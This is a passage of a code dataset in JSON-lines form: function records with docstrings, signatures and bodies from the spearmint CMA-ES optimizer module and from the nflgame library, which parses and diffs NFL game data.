% (N, opts['seed'], time.asctime())) # + func.__name__\n    if opts['CMA_diagonal'] and self.sp.CMA_on:\n        s = ''\n        if opts['CMA_diagonal'] is not True:\n            s = ' for '\n            if opts['CMA_diagonal'] < np.inf:\n                s += str(int(opts['CMA_diagonal']))\n            else:\n                s += str(np.floor(opts['CMA_diagonal']))\n            s += ' iterations'\n            s += ' (1/ccov=' + str(round(1./(self.sp.c1+self.sp.cmu))) + ')'\n        print('   Covariance matrix is diagonal' + s)", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"Tablet test objective function\"\"\"\n", "func_signal": "def tablet(self, x, rot=0):\n", "code": "if rot:\n    x = rotate(x)\nx = [x] if np.isscalar(x[0]) else x  # scalar into list\nf = [1e6*x[0]**2 + sum(x[1:]**2) for x in x]\nreturn f if len(f) > 1 else f[0]  # 1-element-list into scalar", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"alias ``reset``, set all state variables to initial values\"\"\"\n", "func_signal": "def initialize(self):\n", "code": "N = self.N\nself.mean = array(self.x0, copy=True)\nself.sigma = self.sigma0\nself.sigmai = np.ones(N)\nself.ps = np.zeros(N)  # path for individual and globalstep-size(s)\nself.r = np.zeros(N)\nself.pr = 0         # cumulation for zr = N(0,1)\nself.sigma_r = 0", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"return C**0.5 times mat, where mat can be a vector or matrix.\nNot functional, because _Croot=C**0.5 is never computed (should be in updateBD)\n\"\"\"\n", "func_signal": "def timesCroot(self, mat):\n", "code": "print(\"WARNING: timesCroot is not yet tested\")\nif self.opts['CMA_diagonal'] is True \\\n               or self.countiter <= self.opts['CMA_diagonal']:\n    res = (self._Croot * mat.T).T\nelse:\n    res = np.dot(self._Croot, mat)\nreturn res", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"get new candidate solutions, sampled from a multi-variate\nnormal distribution and transformed to f-representation\n(phenotype) to be evaluated.\n\nArguments\n---------\n    `number`\n        number of returned solutions, by default the\n        population size ``popsize`` (AKA ``lambda``).\n    `xmean`\n        distribution mean\n    `sigma`\n        multiplier for internal sample width (standard\n        deviation)\n\nReturn\n------\nA list of N-dimensional candidate solutions to be evaluated\n\nExample\n-------\n>>> import cma\n>>> es = cma.CMAEvolutionStrategy([0,0,0,0], 0.3)\n>>> while not es.stop() and es.best.f > 1e-6:  # my_desired_target_f_value\n...     X = es.ask()  # get list of new solutions\n...     fit = [cma.fcts.rosen(x) for x in X]  # call function rosen with each solution\n...     es.tell(X, fit)  # feed values\n\n:See: `ask_and_eval`, `ask_geno`, `tell`\n\n\"\"\"\n", "func_signal": "def ask(self, number=None, xmean=None, sigma_fac=1):\n", "code": "pop_geno = self.ask_geno(number, xmean, sigma_fac)\n\n\n# N,lambda=20,200: overall CPU 7s vs 5s == 40% overhead, even without bounds!\n#                  new data: 11.5s vs 9.5s == 20%\n# TODO: check here, whether this is necessary?\n# return [self.gp.pheno(x, copy=False, bounds=self.gp.bounds) for x in pop]  # probably fine\n# return [Solution(self.gp.pheno(x, copy=False), copy=False) for x in pop]  # here comes the memory leak, now solved\n# pop_pheno = [Solution(self.gp.pheno(x, copy=False), copy=False).repair(self.gp.bounds) for x in pop_geno]\npop_pheno = [self.gp.pheno(x, copy=True, bounds=self.gp.bounds) for x in pop_geno]\n\nif not self.gp.isidentity or use_sent_solutions:  # costs 25% in CPU performance with N,lambda=20,200\n    # archive returned solutions, first clean up archive\n    if self.countiter % 30/self.popsize**0.5 < 1:\n        self.sent_solutions.truncate(0, self.countiter - 1 - 3 * self.N/self.popsize**0.5)\n    # insert solutions\n    for i in xrange(len(pop_geno)):\n        self.sent_solutions[pop_pheno[i]] = {'geno': pop_geno[i],\n                                    'pheno': pop_pheno[i],\n                                    'iteration': self.countiter}\nreturn pop_pheno", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"updated noise level measure using two fitness lists ``self.fit`` and\n``self.fitre``, return ``self.noiseS, all_individual_measures``.\n\nAssumes that `self.idx` contains the indices where the fitness\nlists differ\n\n\"\"\"\n", "func_signal": "def update_measure(self):\n", "code": "lam = len(self.fit)\nidx = np.argsort(self.fit + self.fitre)\nranks = np.argsort(idx).reshape((2, lam))\nrankDelta = ranks[0] - ranks[1] - np.sign(ranks[0] - ranks[1])\n\n# compute rank change limits using both ranks[0] and ranks[1]\nr = np.arange(1, 2 * lam)  # 2 * lam - 2 elements\nlimits = [0.5 * (Mh.prctile(np.abs(r - (ranks[0,i] + 1 - (ranks[0,i] > ranks[1,i]))),\n                              self.theta*50) +\n                 Mh.prctile(np.abs(r - (ranks[1,i] + 1 - (ranks[1,i] > ranks[0,i]))),\n                              self.theta*50))\n            for i in self.idx]\n# compute measurement\n#                               max: 1 rankchange in 2*lambda is always fine\ns = np.abs(rankDelta[self.idx]) - Mh.amax(limits, 1)  # lives roughly in 0..2*lambda\nself.noiseS += self.cum * (np.mean(s) - self.noiseS)\nreturn self.noiseS, s", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"adapt self.evaluations depending on the current measurement value\nand return ``sigma_fac in (1.0, self.alphasigma)``\n\n\"\"\"\n", "func_signal": "def treat(self):\n", "code": "if self.noiseS > 0:\n    self.evaluations = min((self.evaluations * self.alphaevals, self.maxevals))\n    return self.alphasigma\nelse:\n    self.evaluations = max((self.evaluations * self.alphaevalsdown, self.minevals))\n    return 1.0", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"Cigtab test objective function\"\"\"\n", "func_signal": "def twoaxes(self, y):\n", "code": "X = [y] if np.isscalar(y[0]) else y\nN2 = len(X[0]) // 2\nf = [1e6 * sum(x[0:N2]**2) + sum(x[N2:]**2) for x in X]\nreturn f if len(f) > 1 else f[0]", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"initialize the best solution with `x`, `f`, and `evals`.\nBetter solutions have smaller `f`-values.\n\n\"\"\"\n", "func_signal": "def __init__(self, x=None, f=np.inf, evals=None):\n", "code": "self.x = x\nself.x_geno = None\nself.f = f if f is not None and f is not np.nan else np.inf\nself.evals = evals\nself.evalsall = evals\nself.last = BlancClass()\nself.last.x = x\nself.last.f = f", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"Rosenbrock test objective function\"\"\"\n", "func_signal": "def rosen(self, x, alpha=1e2):\n", "code": "x = [x] if np.isscalar(x[0]) else x  # scalar into list\nf = [sum(alpha*(x[:-1]**2-x[1:])**2 + (1.-x[:-1])**2) for x in x]\nreturn f if len(f) > 1 else f[0]  # 1-element-list into scalar", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "# in [0,15]**2\n", "func_signal": "def branin(self, x):\n", "code": "y = x[1]\nx = x[0] + 5\nreturn (y - 5.1*x**2 / 4 / np.pi**2 + 5 * x / np.pi - 6)**2 + 10 * (1 - 1/8/np.pi) * np.cos(x) + 10 - 0.397887357729738160000", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"sets out-of-bounds components of ``x`` on the bounds.\n\nArguments\n---------\n    `bounds`\n        can be `None`, in which case the \"default\" bounds are used,\n        or ``[lb, ub]``, where `lb` and `ub`\n        represent lower and upper domain bounds respectively that\n        can be `None` or a scalar or a list or array of length ``len(self)``\n\ncode is more or less copy-paste from Solution.repair, but never tested\n\n\"\"\"\n# TODO (old data): CPU(N,lam,iter=20,200,100): 3.3s of 8s for two bounds, 1.8s of 6.5s for one bound\n# TODO: test whether np.max([bounds[0], x], axis=0) etc is speed relevant\n\n", "func_signal": "def repair(self, x, bounds=None, copy=False, copy_always=False):\n", "code": "if bounds is None:\n    bounds = self.bounds\nif copy_always:\n    x_out = array(x, copy=True)\nif bounds not in (None, [None, None], (None, None)):  # solely for effiency\n    x_out = array(x, copy=True) if copy and not copy_always else x\n    if bounds[0] is not None:\n        if np.isscalar(bounds[0]):\n            for i in xrange(len(x)):\n                x_out[i] = max([bounds[0], x[i]])\n        else:\n            for i in xrange(len(x)):\n                if bounds[0][i] is not None:\n                    x_out[i] = max([bounds[0][i], x[i]])\n    if bounds[1] is not None:\n        if np.isscalar(bounds[1]):\n            for i in xrange(len(x)):\n                x_out[i] = min([bounds[1], x[i]])\n        else:\n            for i in xrange(len(x)):\n                if bounds[1][i] is not None:\n                    x_out[i] = min([bounds[1][i], x[i]])\nreturn x_out  # convenience return", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"multimodal Schwefel function with domain -500..500\"\"\"\n", "func_signal": "def schwefelmult(self, x, pen_fac = 1e4):\n", "code": "y = [x] if np.isscalar(x[0]) else x\nN = len(y[0])\nf = array([418.9829*N - 1.27275661e-5*N - sum(x * np.sin(np.abs(x)**0.5))\n        + pen_fac * sum((abs(x) > 500) * (abs(x) - 500)**2) for x in y])\nreturn f if len(f) > 1 else f[0]", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"update internal variables for sampling the distribution with the\ncurrent covariance matrix C. This method is O(N^3), if C is not diagonal.\n\n\"\"\"\n# itereigenupdated is always up-to-date in the diagonal case\n# just double check here\n", "func_signal": "def updateBD(self):\n", "code": "if self.itereigenupdated == self.countiter:\n    return\n\nif self.sp.neg.cmuexp:  # cave:\n    self.update_exponential(self.Zneg, -self.sp.neg.cmuexp)\n    # self.C += self.Zpos  # pos update after Zneg would be the correct update, overall:\n    # self.C = self.Zpos + Cs * Mh.expms(-self.sp.neg.cmuexp*Csi*self.Zneg*Csi) * Cs\n    self.Zneg = np.zeros((self.N, self.N))\n\nif self.sigma_vec is not 1 and not np.all(self.sigma_vec == 1):\n    self.C = dot(dot(np.diag(self.sigma_vec), self.C), np.diag(self.sigma_vec))\n    self.sigma_vec[:] = 1\n\nif self.opts['CMA_const_trace'] in (True, 1, 2):  # normalize trace of C\n    if self.opts['CMA_const_trace'] == 2:\n        s = np.exp(np.mean(np.log(self.dC)))\n    else:\n        s = np.mean(self.dC)\n    self.C /= s\n    self.dC /= s\nself.C = (self.C + self.C.T) / 2\n# self.C = np.triu(self.C) + np.triu(self.C,1).T  # should work as well\n# self.D, self.B = eigh(self.C) # hermitian, ie symmetric C is assumed\n\nif type(self.opts['CMA_eigenmethod']) == type(1):\n    print('WARNING: option CMA_eigenmethod should be a function, not an integer')\n    if self.opts['CMA_eigenmethod'] == -1:\n        # pygsl\n        # easy to install (well, in Windows install gsl binaries first,\n        # set system path to respective libgsl-0.dll (or cp the dll to\n        # python\\DLLS ?), in unzipped pygsl edit\n        # gsl_dist/gsl_site_example.py into gsl_dist/gsl_site.py\n        # and run \"python setup.py build\" and \"python setup.py install\"\n        # in MINGW32)\n        if 1 < 3:  # import pygsl on the fly\n            try:\n                import pygsl.eigen.eigenvectors  # TODO efficient enough?\n            except ImportError:\n                print('WARNING: could not find pygsl.eigen module, either install pygsl \\n' +\n                      '  or set option CMA_eigenmethod=1 (is much slower), option set to 1')\n                self.opts['CMA_eigenmethod'] = 0  # use 0 if 1 is too slow\n\n            self.D, self.B = pygsl.eigen.eigenvectors(self.C)\n\n    elif self.opts['CMA_eigenmethod'] == 0:\n        # TODO: thoroughly test np.linalg.eigh\n        #       numpy.linalg.eig crashes in 200-D\n        #       and EVecs with same EVals are not orthogonal\n        self.D, self.B = np.linalg.eigh(self.C)  # self.B[i] is a row and not an eigenvector\n    else:  # is overall two;ten times slower in 10;20-D\n        self.D, self.B = Misc.eig(self.C)  # def eig, see below\nelse:\n    self.D, self.B = self.opts['CMA_eigenmethod'](self.C)\n\n\n# assert(sum(self.D-DD) < 1e-6)\n# assert(sum(sum(np.dot(BB, BB.T)-np.eye(self.N))) < 1e-6)\n# assert(sum(sum(np.dot(BB * DD, BB.T) - self.C)) < 1e-6)\nidx = np.argsort(self.D)\nself.D = self.D[idx]\nself.B = self.B[:,idx]  # self.B[i] is a row, columns self.B[:,i] are eigenvectors\n# assert(all(self.B[self.countiter % self.N] == self.B[self.countiter % self.N,:]))\n\n# qqqqqqqqqq\nif 11 < 3:  # limit condition number to 1e13\n    climit = 1e13  # cave: conditioncov termination is 1e14\n    if self.D[-1] / self.D[0] > climit:\n        self.D += self.D[-1] / climit\n    for i in xrange(self.N):\n        self.C[i][i] += self.D[-1] / climit\n\nif 11 < 3 and any(abs(sum(self.B[:,0:self.N-1] * self.B[:,1:], 0)) > 1e-6):\n    print('B is not orthogonal')\n    print(self.D)\n    print(sum(self.B[:,0:self.N-1] * self.B[:,1:], 0))\nelse:\n    # is O(N^3)\n    # assert(sum(abs(self.C - np.dot(self.D * self.B,  self.B.T))) < N**2*1e-11)\n    pass\nself.D **= 0.5\nself.itereigenupdated = self.countiter", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"counts for each coordinate the number of feasible values in\n``solutions`` and returns an array of length ``len(solutions[0])``\nwith the ratios.\n\n`solutions` is a list or array of repaired `Solution` instances\n\n\"\"\"\n", "func_signal": "def feasible_ratio(self, solutions):\n", "code": "count = np.zeros(len(solutions[0]))\nfor x in solutions:\n    count += x.unrepaired == x\nreturn count / float(len(solutions))", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"Given all \"previous\" candidate solutions and their respective\nfunction values, the state of a `CMAEvolutionStrategy` object\ncan be reconstructed from this history. This is the purpose of\nfunction `feedForResume`.\n\nArguments\n---------\n    `X`\n      (all) solution points in chronological order, phenotypic\n      representation. The number of points must be a multiple\n      of popsize.\n    `function_values`\n      respective objective function values\n\nDetails\n-------\n`feedForResume` can be called repeatedly with only parts of\nthe history. The part must have the length of a multiple\nof the population size.\n`feedForResume` feeds the history in popsize-chunks into `tell`.\nThe state of the random number generator might not be\nreconstructed, but this would be only relevant for the future.\n\nExample\n-------\n::\n\n    import cma\n\n    # prepare\n    (x0, sigma0) = ... # initial values from previous trial\n    X = ... # list of generated solutions from a previous trial\n    f = ... # respective list of f-values\n\n    # resume\n    es = cma.CMAEvolutionStrategy(x0, sigma0)\n    es.feedForResume(X, f)\n\n    # continue with func as objective function\n    while not es.stop():\n       X = es.ask()\n       es.tell(X, [func(x) for x in X])\n\nCredits to Dirk Bueche and Fabrice Marchal for the feeding idea.\n\n:See: class `CMAEvolutionStrategy` for a simple dump/load to resume\n\n\"\"\"\n", "func_signal": "def feedForResume(self, X, function_values):\n", "code": "if self.countiter > 0:\n    print('WARNING: feed should generally be used with a new object instance')\nif len(X) != len(function_values):\n    raise _Error('number of solutions ' + str(len(X)) +\n        ' and number function values ' +\n        str(len(function_values))+' must not differ')\npopsize = self.sp.popsize\nif (len(X) % popsize) != 0:\n    raise _Error('number of solutions ' + str(len(X)) +\n            ' must be a multiple of popsize (lambda) ' +\n            str(popsize))\nfor i in xrange(len(X) / popsize):\n    # feed in chunks of size popsize\n    self.ask()  # a fake ask, mainly for a conditioned calling of updateBD\n                # and secondary to get possibly the same random state\n    self.tell(X[i*popsize:(i+1)*popsize], function_values[i*popsize:(i+1)*popsize])", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"loads data from files written and return a data dictionary, *not*\na prerequisite for using `plot()` or `disp()`.\n\nArgument `filenameprefix` is the filename prefix of data to be loaded (five files),\nby default ``'outcmaes'``.\n\nReturn data dictionary with keys `xrecent`, `xmean`, `f`, `D`, `std`\n\n\"\"\"\n", "func_signal": "def load(self, filenameprefix=None):\n", "code": "if not filenameprefix:\n    filenameprefix = self.name_prefix\nfor i in xrange(len(self.file_names)):\n    fn = filenameprefix + self.file_names[i] + '.dat'\n    try:\n        self.__dict__[self.key_names[i]] = _fileToMatrix(fn)\n    except:\n        print('WARNING: reading from file \"' + fn + '\" failed')\n    if self.key_names[i] in self.key_names_with_annotation:\n        self.__dict__[self.key_names[i]].append(self.__dict__[self.key_names[i]][-1])  # copy last row to later fill in annotation position for display\n    self.__dict__[self.key_names[i]] = array(self.__dict__[self.key_names[i]], copy=False)\nreturn self", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"multiply C with a scalar and update all related internal variables (dC, D,...)\"\"\"\n", "func_signal": "def multiplyC(self, alpha):\n", "code": "self.C *= alpha\nif self.dC is not self.C:\n    self.dC *= alpha\nself.D *= alpha**0.5", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"Argument bounds can be `None` or ``bounds[0]`` and ``bounds[1]``\nare lower  and upper domain boundaries, each is either `None` or\na scalar or a list or array of appropriate size.\n\"\"\"\n##\n# bounds attribute reminds the domain boundary values\n", "func_signal": "def __init__(self, bounds=None):\n", "code": "self.bounds = bounds\n\nself.gamma = 1  # a very crude assumption\nself.weights_initialized = False  # gamma becomes a vector after initialization\nself.hist = []  # delta-f history", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"return flattened data ``(x, f)`` such that for the sweep through\ncoordinate ``i`` we have for data point ``j`` that ``f[i][j] == func(x[i][j])``\n\n\"\"\"\n", "func_signal": "def flattened(self):\n", "code": "flatx = {}\nflatf = {}\nfor i in self.res:\n    if type(i) is int:\n        flatx[i] = []\n        flatf[i] = []\n        for x in sorted(self.res[i]):\n            for d in sorted(self.res[i][x]):\n                flatx[i].append(x)\n                flatf[i].append(d)\nreturn flatx, flatf", "path": "spearmint/spearmint/spearmint/chooser/cma.py", "commit_date": "2013-08-07 00:00:00", "repo_name": "JasperSnoek/spearmint", "stars": 1379, "license": "None", "language": "python", "size": 565}
{"docstring": "\"\"\"\nTakes a single JSON play entry (data) and converts it to an OrderedDict\nof player statistics.\n\nplay is the instance of Play that this data is part of. It is used\nto determine whether the player belong to the home team or not.\n\"\"\"\n", "func_signal": "def _json_play_players(play, data):\n", "code": "players = OrderedDict()\nfor playerid, statcats in data.iteritems():\n    if playerid == '0':\n        continue\n    for info in statcats:\n        if info['statId'] not in nflgame.statmap.idmap:\n            continue\n        if playerid not in players:\n            home = play.drive.game.is_home(info['clubcode'])\n            if home:\n                team_name = play.drive.game.home\n            else:\n                team_name = play.drive.game.away\n            stats = nflgame.player.PlayPlayerStats(playerid,\n                                                   info['playerName'],\n                                                   home, team_name)\n            players[playerid] = stats\n        statvals = nflgame.statmap.values(info['statId'], info['yards'])\n        players[playerid]._add_stats(statvals)\nreturn players", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\npos_team is the team on offense, and yardline is a string formatted\nlike 'team-territory yard-line'. e.g., \"NE 32\".\n\nAn offset can be given directly by specifying an integer for offset.\n\"\"\"\n", "func_signal": "def __init__(self, pos_team=None, yardline=None, offset=None):\n", "code": "if isinstance(offset, int):\n    self.offset = offset\n    return\nif yardline == '50':\n    self.offset = 0\n    return\n\nterritory, yd_str = yardline.split()\nyd = int(yd_str)\nif territory == pos_team:\n    self.offset = -(50 - yd)\nelse:\n    self.offset = 50 - yd", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nReturns the difference between two points of time in a game in terms of\nplays and player statistics. The return value is a GameDiff namedtuple\nwith two attributes: plays and players. Each contains *only* the data\nthat is in the after game but not in the before game.\n\nThis is useful for sending alerts where you're guaranteed to see each\nplay statistic only once (assuming NFL.com behaves itself).\n\"\"\"\n", "func_signal": "def diff(before, after):\n", "code": "assert after.eid == before.eid\n\nplays = []\nafter_plays = list(after.drives.plays())\nbefore_plays = list(before.drives.plays())\nfor play in after_plays:\n    if play not in before_plays:\n        plays.append(play)\n\n# You might think that updated play data is enough. You could scan\n# it for statistics you're looking for (like touchdowns).\n# But sometimes a play can sneak in twice if its description gets\n# updated (late call? play review? etc.)\n# Thus, we do a diff on the play statistics for player data too.\n_players = OrderedDict()\nafter_players = list(after.max_player_stats())\nbefore_players = list(before.max_player_stats())\nfor aplayer in after_players:\n    has_before = False\n    for bplayer in before_players:\n        if aplayer.playerid == bplayer.playerid:\n            has_before = True\n            pdiff = aplayer - bplayer\n            if pdiff is not None:\n                _players[aplayer.playerid] = pdiff\n    if not has_before:\n        _players[aplayer.playerid] = aplayer\nplayers = nflgame.seq.GenPlayerStats(_players)\n\nreturn GameDiff(before=before, after=after, plays=plays, players=players)", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nGets the Nth drive where the first drive corresponds to n=1. This is\nonly useful given a complete collection of drives for an entire game.\n\nIf the team parameter is specified (i.e., team='NE'), then n will\nbe interpreted as *that* team's Nth drive.\n\"\"\"\n", "func_signal": "def number(self, n, team=None):\n", "code": "assert n > 0\nn -= 1\nif team is None:\n    return list(self)[n]\nelse:\n    i = 0\n    for d in self:\n        if d.team == team:\n            if i == n:\n                return d\n            i += 1\n    assert False, \\\n        'Could not find drive %d for team %s.' % (n + 1, team)", "path": "nflgame/nflgame/seq.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nReturns a new field position with the yards added to self.\nYards may be negative.\n\"\"\"\n", "func_signal": "def add_yards(self, yards):\n", "code": "newoffset = max(-50, min(50, self.offset + yards))\nreturn FieldPosition(offset=newoffset)", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nTakes a single JSON drive entry (data) and converts it to a list\nof Play objects. This includes trying to resolve duplicate play\nconflicts by only taking the first instance of a play.\n\"\"\"\n", "func_signal": "def _json_plays(drive, data):\n", "code": "plays = []\nseen_ids = set()\nseen_desc = set()  # Sometimes duplicates have different play ids...\nfor playid in map(str, sorted(map(int, data))):\n    p = data[playid]\n    desc = (p['desc'], p['time'], p['yrdln'], p['qtr'])\n    if playid in seen_ids or desc in seen_desc:\n        continue\n    seen_ids.add(playid)\n    seen_desc.add(desc)\n    plays.append(Play(drive, playid, data[playid]))\nreturn plays", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nAdds two sequences of players by combining repeat players and summing\ntheir statistics.\n\"\"\"\n", "func_signal": "def __add__(self, other):\n", "code": "players = OrderedDict()\nfor p in itertools.chain(self, other):\n    if p.playerid not in players:\n        players[p.playerid] = p\n    else:\n        players[p.playerid] += p\nreturn GenPlayerStats(players)", "path": "nflgame/nflgame/seq.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nSave the JSON data to fpath. This is done automatically if the\ngame is over.\n\"\"\"\n", "func_signal": "def save(self, fpath=None):\n", "code": "if fpath is None:\n    fpath = _jsonf % self.eid\ntry:\n    print >> gzip.open(fpath, 'w+'), self.rawData,\nexcept IOError:\n    print >> sys.stderr, \"Could not cache JSON data. Please \" \\\n                         \"make '%s' writable.\" \\\n                         % os.path.dirname(fpath)", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"Returns the year of the season this game belongs to.\"\"\"\n", "func_signal": "def season(self):\n", "code": "year = int(self.eid[0:4])\nmonth = int(self.eid[4:6])\nif month <= 3:\n    year -= 1\nreturn year", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nReturns a single player whose NFL GameCenter identifier equals\n`playerid`. This probably isn't too useful, unless you're trying\nto do ID mapping. (Players have different identifiers across NFL.com.)\n\nIf no such player with the given identifier is found, None is\nreturned.\n\"\"\"\n", "func_signal": "def playerid(self, playerid):\n", "code": "for p in self:\n    if p.playerid == playerid:\n        return p\nreturn None", "path": "nflgame/nflgame/seq.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nReturns a string of the score of the game.\ne.g., \"NE (32) vs. NYG (0)\".\n\"\"\"\n", "func_signal": "def nice_score(self):\n", "code": "return '%s (%d) at %s (%d)' \\\n       % (self.away, self.score_away, self.home, self.score_home)", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nReturns the combined player stats for every play in the sequence.\n\"\"\"\n", "func_signal": "def players(self):\n", "code": "players = OrderedDict()\nfor play in self:\n    for player in play.players:\n        if player.playerid not in players:\n            players[player.playerid] = player\n        else:\n            players[player.playerid] += player\nreturn GenPlayerStats(players)", "path": "nflgame/nflgame/seq.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nReturns the JSON data corresponding to the game represented by eid.\n\nIf the JSON data is already on disk, it is read, decompressed and returned.\n\nOtherwise, the JSON data is downloaded from the NFL web site. If the data\ndoesn't exist yet or there was an error, _get_json_data returns None.\n\nIf eid is None, then the JSON data is read from the file at fpath.\n\"\"\"\n", "func_signal": "def _get_json_data(eid=None, fpath=None):\n", "code": "assert eid is not None or fpath is not None\n\nif fpath is not None:\n    return gzip.open(fpath).read()\n\nfpath = _jsonf % eid\nif os.access(fpath, os.R_OK):\n    return gzip.open(fpath).read()\ntry:\n    return urllib2.urlopen(_json_base_url % (eid, eid), timeout=5).read()\nexcept urllib2.HTTPError:\n    pass\nexcept socket.timeout:\n    pass\nreturn None", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nParses the 'home' and 'away' team stats and returns an OrderedDict\nmapping player id to their total game statistics as instances of\nnflgame.player.GamePlayerStats.\n\"\"\"\n", "func_signal": "def _json_game_player_stats(game, data):\n", "code": "players = OrderedDict()\nfor team in ('home', 'away'):\n    for category in nflgame.statmap.categories:\n        if category not in data[team]['stats']:\n            continue\n        for pid, raw in data[team]['stats'][category].iteritems():\n            stats = {}\n            for k, v in raw.iteritems():\n                if k == 'name':\n                    continue\n                stats['%s_%s' % (category, k)] = v\n            if pid not in players:\n                home = team == 'home'\n                if home:\n                    team_name = game.home\n                else:\n                    team_name = game.away\n                players[pid] = nflgame.player.GamePlayerStats(pid,\n                                                              raw['name'],\n                                                              home,\n                                                              team_name)\n            players[pid]._add_stats(stats)\nreturn players", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", 